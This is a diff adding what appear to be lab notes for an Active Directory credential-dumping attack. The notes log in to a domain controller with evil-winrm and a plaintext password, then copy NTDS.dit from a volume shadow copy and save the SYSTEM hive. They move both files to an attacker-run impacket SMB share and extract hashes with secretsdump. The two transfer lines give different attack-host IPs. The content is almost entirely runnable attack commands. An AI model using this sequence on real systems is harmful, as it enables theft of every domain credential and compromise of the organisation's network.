@@ -1,0 +1,72 @@
+#################### CONNECT TO TARGET ####################
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+
+
+
+#################### CHECK RIGHTS ####################
+net localgroup
+Administrators group
+
+net user bwilliamson
+Domain Admins group
+
+
+
+#################### CREATE SHADOW COPY OF C: ####################
+vssadmin CREATE SHADOW /For=C:
+
+
+
+#################### EXTRACT NTDS.DIT OUT OF SHADOW COPY ####################
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+
+
+#################### SAVE SYSTEM HIVE ####################
+reg.exe save hklm\system C:\system.save
+
+
+
+#################### TRANSFER NTDS.DIT AND SYSTEM TO ATTACK HOST ####################
+https://github.com/fortra/impacket/blob/master/examples/smbserver.py
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
+cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
+cmd.exe /c move C:\system.save \\10.10.15.16\CompData
+
+
+
+#################### EXTRACT HASHES ####################
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
